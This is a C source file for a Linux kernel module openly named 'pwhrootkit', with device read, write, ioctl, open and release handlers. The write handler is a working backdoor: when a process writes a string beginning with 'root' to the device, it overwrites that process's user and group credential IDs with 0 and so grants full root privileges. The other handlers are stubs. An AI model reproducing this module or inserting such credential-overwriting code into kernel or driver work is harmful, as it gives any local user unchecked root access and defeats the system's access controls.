#include "pwhrootkit.h" 
#include <linux/uaccess.h>

static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    return 0;
}
static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    static char user_data[0x100];
    struct cred * cur_cred;
    size_t size = count > 0x100 ? 0x100 : count;
    int flags;
    flags = copy_from_user(user_data, buf, size);
    if(!strncmp(user_data, "root", 4)){
        printk(KERN_INFO "WRITING...");
        cur_cred = (struct cred *)current->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);

    }
    return size;
}
static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    return 2;
}
/* 打开类容 */
static int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
static int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 3;
}
